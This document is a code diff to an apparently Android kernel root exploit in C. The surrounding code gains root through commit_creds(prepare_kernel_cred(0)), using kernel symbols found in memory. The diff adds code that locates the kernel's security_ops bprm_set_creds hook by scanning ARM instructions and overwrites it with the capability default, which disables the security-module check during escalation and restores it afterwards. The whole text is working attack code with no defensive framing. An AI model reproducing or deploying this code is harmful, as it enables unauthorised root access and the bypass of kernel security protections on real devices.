@@ -70,14 +70,60 @@ syscall_perf_event_open(uint32_t offset)
 
 struct cred;
 struct task_struct;
+struct linux_binprm;
 
 struct cred *(*prepare_kernel_cred)(struct task_struct *) = NULL;
 int (*commit_creds)(struct cred *) = NULL;
+int (*security_bprm_set_creds)(struct linux_binprm *) = NULL;
+int (*cap_bprm_set_creds)(struct linux_binprm *) = NULL;
+int (*original_bprm_set_creds)(struct linux_binprm *) = NULL;
+int (**security_ops_bprm_set_creds)(struct linux_binprm *) = NULL;
+
+static void *
+get_security_ops_bprm_set_creds(void *address)
+{
+  int *value;
+  int i;
+
+  value = (int*)address;
+  for (i = 0; i < 0x10; i++) {
+    if ((value[i] & 0xffff0000) == 0xe8bd0000) {
+      int offset = value[i - 1] & 0xfff;
+      unsigned int *security_ops;
+      security_ops = (unsigned int*)value[i + 1];
+      return (void*)(*security_ops + offset);
+    }
+  }
+}
+
+int
+restore_bprm_set_creds(void)
+{
+  if (original_bprm_set_creds) {
+    *security_ops_bprm_set_creds = original_bprm_set_creds;
+    security_ops_bprm_set_creds = NULL;
+    original_bprm_set_creds = NULL;
+  }
+
+  return 0;
+}
 
 int
 obtain_root_privilege(void)
 {
-  return commit_creds(prepare_kernel_cred(0));
+  int ret;
+
+  if (security_bprm_set_creds && cap_bprm_set_creds) {
+    security_ops_bprm_set_creds = get_security_ops_bprm_set_creds(security_bprm_set_creds);
+    if (*security_ops_bprm_set_creds != cap_bprm_set_creds) {
+      original_bprm_set_creds = *security_ops_bprm_set_creds;
+      *security_ops_bprm_set_creds = cap_bprm_set_creds;
+    }
+  }
+
+  ret = commit_creds(prepare_kernel_cred(0));
+
+  return ret;
 }
 
 static bool
@@ -372,6 +418,8 @@ setup_cred_functions(int offset)
   if (kallsyms_in_memory_init(kernel, KERNEL_SIZE)) {
     commit_creds = (void*)kallsyms_in_memory_lookup_name("commit_creds");
     prepare_kernel_cred = (void*)kallsyms_in_memory_lookup_name("prepare_kernel_cred");
+    security_bprm_set_creds = (void*)kallsyms_in_memory_lookup_name("security_bprm_set_creds");
+    cap_bprm_set_creds = (void*)kallsyms_in_memory_lookup_name("cap_bprm_set_creds");
   }
   free(kernel);
 
